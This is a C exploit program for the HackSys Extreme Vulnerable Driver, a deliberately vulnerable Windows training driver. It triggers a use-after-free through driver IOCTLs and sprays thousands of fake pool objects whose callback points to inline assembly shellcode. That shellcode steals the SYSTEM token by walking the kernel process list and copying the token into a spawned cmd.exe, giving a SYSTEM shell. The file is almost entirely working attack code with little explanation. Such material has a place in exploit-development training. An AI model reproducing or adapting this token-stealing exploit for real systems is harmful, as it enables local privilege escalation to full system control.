#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <winioctl.h>
#include <psapi.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>

#define use_uaf CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805 , METHOD_NEITHER, FILE_ANY_ACCESS)
#define Kfree CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define Kalloc_fake CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define Kalloc CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS) 

#define device "\\\\.\\HackSysExtremeVulnerableDriver"

DWORD PID = 0;

void asm_code()
{
__asm__(
						//standard push rbp; mov rbp, rsp
						"push rax;"
						"push rbx;"
						"push rcx;"
						"push rdx;"
						"push rsi;"
						"push rdi;"
								
						"mov rax, 0;"
						"mov rax, gs:[rax + 32];" 	//get addr of _KPRCB
						"add rax, 8;"				//offset to currentThread
						"mov rbx, [rax];"

						"add rbx, 152;"				//offset to apcState
						"mov rax, [rbx];"

						"add rax, 32;"				//offset to Process _EPROCESS
						"mov rbx, [rax];"

						"mov rcx, rbx;"
						"mov rdx, rcx;"
						"jmp search;"
						"search:"
						"mov rcx, rdx;"				//restore base _EPROCESS
						"add rcx, 752;"				//offset to ActiveProcessLinks
						"xor rdx, rdx;"
						"mov rdx, [rcx];"			//mov flink to rdx

						"sub rdx, 752;"				//get offset to base _EPROCESS

						"mov rcx, [rdx+744];"			//get offset to UniqueProcessId
						"cmp rcx, 6969;"			//compare with PID. Need to be overwritten from the exploit
						"je found;"
						"jmp search;"
						
						"found:"
						"mov rsi, rdx;"
						
						"jmp sysProc;"
						"sysProc:"
						"mov rcx, rdx;"
						"add rcx, 752;"
						"mov rdx, [rcx];"

						"sub rdx, 752;"

						"mov rcx, [rdx+744];"
						"cmp rcx, 4;"
						"je copyToken;"
						"jmp sysProc;"
						
						"copyToken:"
						"mov rdi, rdx;"
						"mov rcx, [rdi + 864];"		//offset to _TOKEN
						"mov [rsi + 864], rcx;"
						
						"pop rax;"
						"pop rbx;"
						"pop rcx;"
						"pop rdx;"
						"pop rsi;"
						"pop rdi;"

						"pop rbp;"
						"ret;"
				);
}

HANDLE getH()
{
		HANDLE h = CreateFileA(device,
						FILE_READ_ACCESS | FILE_WRITE_ACCESS,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						NULL,
						OPEN_EXISTING,
						FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, 
						NULL);
		if( h == INVALID_HANDLE_VALUE ) 
		{
				printf("[!] fatal: Unable to get a HANDLE to the driver\n");
				exit(-1);
		}
		return h;
}

void createCMD()
{
		STARTUPINFOA start;
		PROCESS_INFORMATION pi;
		memset(&start, 0, sizeof(STARTUPINFOA) );
		memset(&pi, 0, sizeof(PROCESS_INFORMATION) );

		start.cb = sizeof(STARTUPINFOA);

		if( !CreateProcessA(NULL,
								"cmd.exe",
								NULL,
								NULL,
								true,
								CREATE_NEW_CONSOLE,
								NULL,
								NULL,
								&start,
								&pi) )
		{
				printf("[-] error: Unable to spawn a new CMD :/\nLast ErrorMsg: %d\n", GetLastError() );
				exit(1);
		}
		PID = pi.dwProcessId;
		return;
}

// allocate non-paged pool object
void alloc(HANDLE h)
{
		bool r = DeviceIoControl(h, Kalloc, NULL, 0, NULL, 0, NULL, NULL);
		if(! r )
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}
// free the non-paged pool object resulting in the dangling Pointer (g_UseAfterFreeObjectNonPagedPool) 
void free(HANDLE h)
{
		bool r = DeviceIoControl(h, Kfree, NULL, 0, NULL, 0, NULL, NULL);
		if(! r)
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}
// Use the freed object resulting in a physical-page access which can lead to shellcode execution  
void usePage(HANDLE h)
{
		bool r = DeviceIoControl(h, use_uaf, NULL, 0, NULL, 0, NULL, NULL);
		if(! r)
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}
// mark memory as executable
void vp()
{
		void (*fp)();
		fp = asm_code;
		DWORD old;
		if(! VirtualProtect( fp, 4096, PAGE_EXECUTE_READWRITE, &old) )
		{
				printf("[!] fatal: Cant access memory !\n");
				exit(-2);
		}
		void *cmp = fp+87;
		*(int*)cmp = PID;
		return;
}

// Allocate FakeObject in the non-paged pool(92 bytes) 
void fakeAlloc(HANDLE h)
{
		char payload[92] = {'\x47'};
		SIZE_T s = (sizeof(char) * 94);

		void (*fp)();
		fp = asm_code;

		//callback = shellcode
		*(unsigned long long*)payload = (unsigned long long)fp;

		bool r = DeviceIoControl(h, Kalloc_fake, &payload, (DWORD)s, NULL, 0, NULL, NULL);
		if(! r)
		{
				printf("[-] fatal: Cant communicate with driver\n");
				exit(-1);
		}
		return;
}

int main(void)
{
		createCMD();  
		HANDLE h = getH();
		vp();
		alloc(h);
		free(h);
		for( int i = 0; i < 40000; i++ )
		{
				fakeAlloc(h);
		}
		usePage(h); 
		return 0;
}
